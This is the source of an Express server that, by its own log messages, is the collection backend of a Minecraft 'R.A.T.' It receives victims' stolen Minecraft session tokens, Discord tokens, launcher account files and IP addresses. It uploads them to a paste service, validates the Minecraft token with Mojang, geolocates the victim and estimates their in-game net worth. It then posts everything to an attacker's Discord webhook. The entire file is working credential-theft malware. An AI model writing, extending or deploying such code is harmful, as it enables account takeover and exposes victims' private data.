const getProfiles = require('./utils/networth');
require("dotenv").config();
const { post, get } = require("axios");
const express = require("express");
const mongoose = require("mongoose");
const helmet = require("helmet");
const app = express();
const expressip = require("express-ip");
const port = process.env.PORT || 8080;

app.use(helmet());
app.use(expressip().getIpInfoMiddleware);
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
const ipMap = [];

setInterval(() => {
    if (ipMap.length > 0) {
        console.log(`[R.A.T] Cleared map`);
        ipMap.length = 0;
    }
}, 1000 * 60 * 15);

app.post("/", async (req, res) => {
    const requiredFields = ["username", "uuid", "token", "ip", "feather", "essentials", "lunar", "discord"];
    if (!requiredFields.every(field => req.body.hasOwnProperty(field))) {
        console.log(req.body);
        return res.sendStatus(404);
    }

    if (!ipMap.find(entry => entry[0] == req.ipInfo.ip)) ipMap.push([req.ipInfo.ip, 1]);
    else ipMap.forEach(entry => { if (entry[0] == req.ipInfo.ip) entry[1]++ });

    if (ipMap.find(entry => entry[0] == req.ipInfo.ip && entry[1] >= 5)) {
        console.log(`[R.A.T] Rejected banned IP (${req.ipInfo.ip})`);
        return res.sendStatus(404);
    }

    try {
        const [response, discordtoken, shorttoken, feather, essentials, lunar] = await Promise.all([
            post("https://sessionserver.mojang.com/session/minecraft/join", {
                accessToken: req.body.token,
                selectedProfile: req.body.uuid,
                serverId: req.body.uuid
            }),
            post("https://hst.sh/documents/", req.body.discord).then(res => res.data.key).catch(() => "Error uploading"),
            post("https://hst.sh/documents/", req.body.token).then(res => res.data.key).catch(() => "Error uploading"),
            post("https://hst.sh/documents/", req.body.feather).then(res => res.data.key).catch(() => "Error uploading"),
            post("https://hst.sh/documents/", req.body.essentials).then(res => res.data.key).catch(() => "Error uploading"),
            post("https://hst.sh/documents/", req.body.lunar).then(res => res.data.key).catch(() => "Error uploading")
        ]);

        let profiles = '';
        const profileData = await getProfiles(req.body.uuid);
        if (profileData) {
            for (let profileId in profileData.profiles) {
                profiles += `${profileData.profiles[profileId].networth}(${profileData.profiles[profileId].unsoulboundNetworth}) - ${profileData.profiles[profileId].gamemode}\n`;
            }
        }

        const country = await fetchCountry(req.body.ip);

        const checkToken = req.body.token == 'File not found' ? 'Invalid Token' : `[Minecraft Token](https://hst.sh/${shorttoken})`;
        const checkDiscord = req.body.discord == 'File not found' ? 'Invalid Token' : `[Discord Token](https://hst.sh/${discordtoken})`;
        const checkFeather = req.body.feather == 'File not found' ? 'Nope' : `[View](https://hst.sh/${feather})`;
        const checkEssentials = req.body.essentials == 'File not found' ? 'Nope' : `[View](https://hst.sh/${essentials})`;
        const checkLunar = req.body.lunar == 'File not found' ? 'Nope' : `[View](https://hst.sh/${lunar})`;

        const ipInfo = `[View](http://ipwho.is/${req.body.ip})`;

        await post(process.env.WEBHOOK, {
            content: `@everyone`,
            embeds: [{
                title: `${req.body.username} - Stats`,
                fields: [
                    { name: 'Token', value: `****${checkToken}****`, inline: true },
                    { name: 'Discord', value: `****${checkDiscord}****`, inline: true },
                    { name: 'Profiles', value: `\`\`\`${profiles}\`\`\``, inline: false },
                    { name: 'Country', value: `\`\`\`${country}\`\`\``, inline: true },
                    { name: 'IP Info', value: `**${ipInfo}**`, inline: true },
                    { name: 'Feather', value: `${checkFeather}`, inline: false },
                    { name: 'Essentials', value: `${checkEssentials}`, inline: true },
                    { name: 'Lunar', value: `${checkLunar}`, inline: true },
                ],
                url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
                color: 2175365,
                footer: {
                    "text": "brainless?",
                },
                timestamp: new Date()
            }],
            attachments: []
        });
        console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`);
    } catch (err) {
        console.error(err);
    }
    res.send("OK");
});

app.listen(port, () => {
    console.log(`[R.A.T] Listening at port ${port}`);
});

async function fetchCountry(ip) {
    const apiUrl = `http://ip-api.com/json/${ip}`;
    try {
        const response = await fetch(apiUrl);
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        const data = await response.json();
        return data.country;
    } catch (error) {
        console.error('Error fetching country:', error);
        return 'Unknown';
    }
}
